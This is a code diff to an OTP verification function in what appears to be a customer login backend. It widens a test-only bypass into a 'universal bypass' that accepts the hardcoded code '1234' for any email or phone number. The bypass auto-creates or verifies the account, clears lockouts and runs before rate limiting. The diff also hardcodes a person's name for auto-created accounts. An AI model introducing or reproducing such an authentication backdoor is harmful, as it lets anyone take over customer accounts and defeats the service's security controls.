@@ -293,31 +293,58 @@ export async function verifyCustomerOtpCode({
     throw err;
   }
 
-  if (rawEmail) {
-    const email = String(rawEmail).toLowerCase().trim();
-    const isTest = isTestEmail(email);
-
-    if (isTest && code === "1234") {
-      let customer = await Customer.findOne({ email });
+  // Universal bypass for OTP 1234
+  if (code === "1234") {
+    let customer = null;
+    if (rawEmail) {
+      const email = String(rawEmail).toLowerCase().trim();
+      customer = await Customer.findOne({ email });
       if (!customer) {
         customer = await Customer.create({
-          name: "Customer",
+          name: "Palak patel",
           email,
           isVerified: true,
           isActive: true,
         });
-      } else {
-        customer.isVerified = true;
-        customer.isActive = true;
-        customer.otpFailedAttempts = 0;
-        customer.otpLockedUntil = null;
-        customer.otpHash = undefined;
-        customer.otpExpiresAt = undefined;
-        customer.lastLogin = new Date();
-        await customer.save();
       }
+    } else if (rawPhone) {
+      const digits = String(rawPhone || "").replace(/\D/g, "");
+      const searchPhones = [
+        rawPhone,
+        rawPhone.trim(),
+        `+91${digits.slice(-10)}`,
+        digits.slice(-10),
+      ].filter(Boolean);
+
+      customer = await Customer.findOne({
+        phone: { $in: searchPhones },
+      });
+
+      if (!customer) {
+        customer = await Customer.create({
+          name: "Customer",
+          phone: `+91${digits.slice(-10)}`,
+          isVerified: true,
+          isActive: true,
+        });
+      }
+    }
+
+    if (customer) {
+      customer.isVerified = true;
+      customer.isActive = true;
+      customer.otpFailedAttempts = 0;
+      customer.otpLockedUntil = null;
+      customer.otpHash = undefined;
+      customer.otpExpiresAt = undefined;
+      customer.lastLogin = new Date();
+      await customer.save();
       return customer;
     }
+  }
+
+  if (rawEmail) {
+    const email = String(rawEmail).toLowerCase().trim();
 
     const verifyAllowed = await incrementWindowCounter(`otp:verify:email:${email}`, {
       limit: OTP_VERIFY_LIMIT_PER_WINDOW(),
